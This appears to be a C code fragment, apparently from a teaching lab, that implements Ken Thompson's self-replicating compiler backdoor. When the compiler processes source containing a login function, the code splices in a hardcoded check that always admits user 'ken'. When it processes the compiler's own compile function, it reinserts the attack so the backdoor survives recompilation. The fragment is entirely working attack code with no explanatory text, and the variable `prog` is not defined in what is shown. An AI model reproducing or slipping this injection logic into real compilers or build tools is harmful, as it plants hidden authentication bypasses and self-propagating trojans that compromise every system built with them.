static char login_sig[] = "int login(char *user) {";
static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
static char compile_sig[] =
        "static void compile(char *program, char *outname) {\n"
        "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
        "    assert(fp);"
        ;

char new_program[4096];
memset(new_program, '\0', 4096);
strcpy(new_program, "#include \"attack-array.h\"\n");
int new_prog_i = strlen(new_program);
int i = 0;
char* login_found;
char* compile_found;
if ((login_found = strstr(program, login_sig)) != NULL) {
  while (program + i != login_found) {
    new_program[new_prog_i] = program[i];
    i++;
    new_prog_i++;
  }
  new_program[new_prog_i] = '\0';
  strcat(new_program, login_sig);
  strcat(new_program, "\n");
  strcat(new_program, login_attack);
  strcat(new_program, login_found + strlen(login_sig));
  strcpy(program, new_program);
}
else if ((compile_found = strstr(program, compile_sig)) != NULL) {
  while (program + i != compile_found) {
    new_program[new_prog_i] = program[i];
    i++;
    new_prog_i++;
  }
  new_program[new_prog_i] = '\0';
  strcat(new_program, compile_sig);
  strcat(new_program, "\n");
  strcat(new_program, prog);
  strcat(new_program, compile_found + strlen(compile_sig));
  strcpy(program, new_program);
}
